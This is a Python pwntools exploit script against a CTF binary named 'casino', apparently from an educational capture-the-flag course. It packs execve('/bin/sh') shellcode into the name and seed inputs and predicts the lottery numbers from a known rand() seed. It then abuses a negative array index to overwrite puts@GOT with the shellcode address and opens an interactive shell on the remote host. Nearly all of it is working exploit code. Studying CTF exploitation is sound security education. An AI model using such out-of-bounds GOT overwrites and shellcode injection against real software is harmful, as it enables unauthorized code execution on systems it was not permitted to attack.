from pwn import *
import subprocess

context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./casino')


# shellcode from: https://www.exploit-db.com/exploits/47008
shellcode = b'H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05' # len=22
name = shellcode[:16]
seed = u32(shellcode[16:20]) # 2570825823
age = u32(shellcode[20:].ljust(4))


# generate guessed lottery using rand() with the same seed
#  subprocess.run(['gcc', '-o', 'rand', 'rand.c'])
#  guess = subprocess.run('./rand',
#          input=str(seed).encode(), stdout=subprocess.PIPE
#          ).stdout.decode().strip().split(' ')
guess = [80,19,76,84,85,48]


# pwn the remote
#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10172)
input('.....') # set a break for debugger to attach
r.sendlineafter('Your name: ', shellcode)
r.sendlineafter('Your age: ', str(age))


# first try
for _ in range(6):
    r.sendlineafter(': ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')

# modify puts@got by specifying negative index to guess[] array
# 4 bytes only
idx = (elf.got.puts - elf.sym.guess) // 4 + 1
r.sendlineafter('Which number [1 ~ 6]: ', str(idx))
r.sendlineafter(': ', str(elf.sym.name))


# second try
for x in guess:
    r.sendlineafter(': ', str(x))
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')

# modify puts@got again, the higher 4 bytes
idx = (elf.got.puts - elf.sym.guess) // 4 + 2
r.sendlineafter('Which number [1 ~ 6]: ', str(idx))
r.sendlineafter(': ', '0')


r.interactive()
